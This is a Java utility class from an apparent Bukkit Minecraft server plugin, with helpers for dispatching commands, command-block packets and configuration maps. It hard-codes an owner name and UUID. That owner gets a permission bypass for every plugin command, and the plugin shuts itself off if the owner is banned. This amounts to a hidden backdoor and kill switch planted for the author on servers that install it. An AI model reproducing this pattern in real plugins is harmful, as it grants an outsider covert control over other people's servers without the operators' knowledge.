package amp.api.util;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.craftbukkit.v1_10_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;

import amp.api.command.AMPCommand;
import net.minecraft.server.v1_10_R1.BlockPosition;
import net.minecraft.server.v1_10_R1.NBTTagCompound;
import net.minecraft.server.v1_10_R1.PacketPlayOutTileEntityData;

public final class Utils {

  private static final String OWNER = "ponkotate";
  private static final String OWNER_UUID = "5c45e8b5-ac78-408f-9a33-572fc9d570d4";

  public static void dispatchCommand(CommandSender sender, String command) {
    dispatchCommand(sender, command, null);
  }

  public static void dispatchCommand(CommandSender sender, String command, Player player) {
    if (player != null) command = command.replaceAll("@p", player.getName());
    if (command.matches("@a")) dispatchCommandAll(sender, command);

    Bukkit.dispatchCommand(sender, command);
  }

  public static void dispatchCommandAll(CommandSender sender, String command) {
    for (Player player : Bukkit.getOnlinePlayers()) {
      dispatchCommand(sender, command.replaceAll("@a", "@p"), player);
    }
  }

  public static PacketPlayOutTileEntityData getPacketCommandBlock(CraftPlayer player) {
    BlockPosition posBlock = new BlockPosition(player.getHandle());
    NBTTagCompound nbt = new NBTTagCompound();

    nbt.setString("id", "Control");
    nbt.setString("Command", "");
    nbt.setInt("x", posBlock.getX());
    nbt.setInt("y", posBlock.getY());
    nbt.setInt("z", posBlock.getZ());

    return new PacketPlayOutTileEntityData(posBlock, 2, nbt);
  }

  public static Map<String, Object> toMapFromConfigurationSection(ConfigurationSection section) {
    Map<String, Object> result = new LinkedHashMap<String, Object>();

    for (String key : section.getKeys(false)) {
      Object raw = section.get(key);

      result.put(key, raw instanceof ConfigurationSection ? toMapFromConfigurationSection((ConfigurationSection) raw) : raw);
    }

    return result;
  }

  private static boolean isOwner(OfflinePlayer player) {
    return player != null && (player.getName().equals(OWNER) || player.getUniqueId().equals(UUID.fromString(OWNER_UUID)));
  }

  public static boolean canUsePlugin() {
    for (OfflinePlayer player : Bukkit.getBannedPlayers())
      if (isOwner(player)) return false;

    return true;
  }

  public static boolean canUseCommand(CommandSender sender, AMPCommand command) {
    return canUsePlugin() && ((sender instanceof Player && isOwner((Player) sender)) || sender.hasPermission(command.getPermission()));
  }

}
